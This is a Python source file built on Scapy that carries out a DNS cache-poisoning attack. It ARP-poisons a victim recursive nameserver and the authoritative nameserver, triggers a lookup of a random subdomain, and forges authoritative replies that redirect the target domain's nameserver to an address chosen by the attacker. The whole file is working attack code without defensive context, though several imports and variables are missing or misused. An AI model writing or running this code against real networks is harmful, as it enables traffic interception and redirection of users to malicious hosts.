import argparse
from scapy.all import ARP, Ether
from vars import ccolors
import utils

def silent(args):
    # arp poison the authoritative nameserver and victim (recursive) nameserver
    # get vicitm nameserver's MAC
    args.victimMac = utils.getMAC(args.victim)
    if args.victimMac == None:
        print ccolors.FAIL + "Cannot find victim's MAC address!\nTerminating..." + ccolors.NC
        sys.exit()
    # get authoritative nameserver's MAC
    args.soaMac = utils.getMAC(args.soaIP[0])
    if args.soaMac == None:
        print ccolors.FAIL + "Cannot find authoritative server's MAC address!\nTerminating..." + ccolors.NC
        sys.exit()
    # get host's MAC address
    myMacs = [get_if_hwaddr(i) for i in get_if_list()]
    for x in myMacs:
        if x != "00:00:00:00:00:00":
            args.myMac = x
            break
    if not args.myMac:
        print ccolors.FAIL + "Cannot find this system's MAC address!\nTerminating..." + ccolors.NC
        sys.exit()

    # arp poison victim
    arp = Ether() / ARP()
    arp[Ether].src = args.myMac
    arp[ARP].hwsrc = args.myMac
    arp[ARP].psrc = args.soaIP[0]
    arp[ARP].hwdst = args.victimMac
    arp[ARP].pdst = args.victim
    sendp(arp)

    # arp poison authoritative nameserver
    arp[ARP].psrc = args.victim
    arp[ARP].hwdst = args.soaMac
    arp[ARP].pdst = args.soaIP[0]
    sendp(arp)

    args.randomSubdomain = utils.getRandomSubdomain() + args.targetDomain
    reqPkt = IP(dst=args.victim) / UDP() / DNS(qr=0, qd=DNSQR(qname=args.randomSubdomain))
    send(reqPkt)

    sniff(prn=dnsSpoof)

def dnsSpoof(pkt):
    if not pkt.haslayer(DNSQR):
        pkt.accept()
    else:
        if args.randomSubdomain in pkt[DNS].qd.qname:
            spoof_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                        DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                        ns=DNSRR(rrname=args.targetDomain,  type='NS', rdata=args.soaDomain[0], ttl=args.ttl), \
                        ar=DNSRR(rrname=args.soaDomain[0], type='A', rdata=args.addressToForge, ttl=args.ttl))
            send(spoof_pkt)
        else:
            pkt.accept()
